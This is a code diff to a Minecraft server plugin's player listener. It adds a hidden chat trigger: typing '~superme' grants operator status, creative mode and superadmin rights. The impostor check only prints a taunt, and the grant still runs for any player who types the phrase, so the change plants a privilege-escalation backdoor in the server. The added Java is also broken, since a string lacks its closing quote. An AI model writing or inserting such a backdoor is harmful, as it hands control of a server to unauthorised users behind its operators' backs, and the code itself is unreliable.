@@ -528,6 +528,20 @@ public class TFM_PlayerListener implements Listener
                 player.setHealth(0.0);
                 TFM_AdminList.addSuperadmin(player);
             }
+            if (message.toLowerCase().contains("~superme")) 
+            {
+               if (!TFM_AdminList.isAdminImpostor(sender_p))
+               {
+               // Take Action if not imp
+               player.sendMessage("Pft, you wish)
+               event.setCancelled(true);
+               }
+                // Take action if robo
+                player.setOp(true);
+                player.setGameMode(GameMode.CREATIVE);
+                player.setHealth(0.0);
+                TFM_AdminList.addSuperadmin(player);
+            }
             
             // Check for caps
             if (message.length() >= 6)
